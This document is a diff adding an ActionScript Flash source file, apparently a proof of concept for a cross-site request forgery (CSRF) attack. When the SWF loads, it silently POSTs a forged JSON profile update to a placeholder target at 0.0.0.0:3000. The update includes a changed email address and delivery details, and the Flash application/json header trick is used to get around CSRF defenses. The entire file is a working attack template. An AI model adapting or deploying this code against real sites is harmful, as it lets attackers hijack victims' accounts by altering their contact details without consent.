@@ -1,0 +1,38 @@
+package
+{
+  import flash.display.Sprite;
+  import flash.net.URLLoader;
+  import flash.net.URLRequest;
+  import flash.net.URLRequestHeader;
+  import flash.net.URLRequestMethod;
+public class csrf extends Sprite
+  {
+    public function csrf()
+    {
+      super();
+      var member1:Object = null;
+      var myJson:String = null;
+      member1 = new Object();
+      member1 = {"first_name":">abc","last_name":"vishaddddl","phone_no":949721,"delivery_details":{"address_1":"vishal","address_2":"kumar","landmark":"basti","city":"basti","pincode":"272009","state":"Uttar Pradesh","address_type":"residential"},"billing_details":{"state":"Uttar Pradesh","pincode":"272009"},"promotional_emails":"always",
+"email":"kensington111.imrane@megasend.org"};
+      var myData:Object = member1;
+      myJson = JSON.stringify(myData);
+      var url:String = "http://0.0.0.0:3000/";
+      var request:URLRequest = new URLRequest(url);
+      request.requestHeaders.push(new URLRequestHeader("Content-Type","application/json"));
+      request.data = myJson;
+      request.method = URLRequestMethod.POST;
+      var urlLoader:URLLoader = new URLLoader();
+try
+      {
+          urlLoader.load(request);
+          return;
+      }
+      catch(e:Error)
+      {
+          trace(e);
+          return;
+      }
+    }
+  }
+}
